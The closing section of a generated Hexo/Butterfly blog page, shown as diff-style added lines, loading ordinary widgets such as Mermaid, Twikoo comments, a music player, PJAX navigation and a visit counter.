src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
+  const $mermaidWrap = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaidWrap.length) {
+    window.runMermaid = () => {
+      window.loadMermaid = true
+      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+      Array.from($mermaidWrap).forEach((item, index) => {
+        const mermaidSrc = item.firstElementChild
+        const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+        const mermaidID = 'mermaid-' + index
+        const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+        mermaid.mermaidAPI.render(mermaidID, mermaidDefinition, (svgCode) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svgCode)
+        })
+      })
+    }
+
+    const loadMermaid = () => {
+      window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
+    }
+
+    window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+  }
+})()</script><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://chalnl-blog-91csefeak-chalnl.vercel.app/',
+      region: 'ap-shanghai',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://chalnl-blog-91csefeak-chalnl.vercel.app/',
+      region: 'ap-shanghai',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script src="/js/ip_content.js"></script><div class="aplayer no-destroy" data-id="7675104902" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = flase;
+POWERMODE.mobile = flase;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="富强,民主,文明,和谐,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
